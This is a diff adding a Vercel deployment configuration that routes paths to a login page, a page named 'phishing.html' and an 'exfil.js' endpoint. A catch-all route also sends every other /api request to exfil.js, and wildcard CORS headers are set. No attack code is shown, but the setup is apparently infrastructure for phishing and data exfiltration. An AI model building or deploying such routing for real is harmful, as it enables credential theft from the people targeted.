@@ -1,0 +1,54 @@
+{
+    "version": 2,
+    "builds": [
+        {
+            "src": "api/**/*.js",
+            "use": "@vercel/node"
+        },
+        {
+            "src": "api/**/*.html",
+            "use": "@vercel/static"
+        }
+    ],
+    "routes": [
+        {
+            "src": "/api/dashboard",
+            "dest": "/api/dashboard.html"
+        },
+        {
+            "src": "/api/login",
+            "dest": "/api/login.html"
+        },
+        {
+            "src": "/api/phishing",
+            "dest": "/api/phishing.html"
+        },
+        {
+            "src": "/api/exfil",
+            "dest": "/api/exfil.js"
+        },
+        {
+            "src": "/api/(.*)",
+            "dest": "/api/exfil.js"
+        }
+    ],
+    "headers": [
+        {
+            "source": "/api/(.*)",
+            "headers": [
+                {
+                    "key": "Access-Control-Allow-Origin",
+                    "value": "*"
+                },
+                {
+                    "key": "Access-Control-Allow-Methods",
+                    "value": "GET,POST,OPTIONS"
+                },
+                {
+                    "key": "Access-Control-Allow-Headers",
+                    "value": "*"
+                }
+            ]
+        }
+    ]
+}
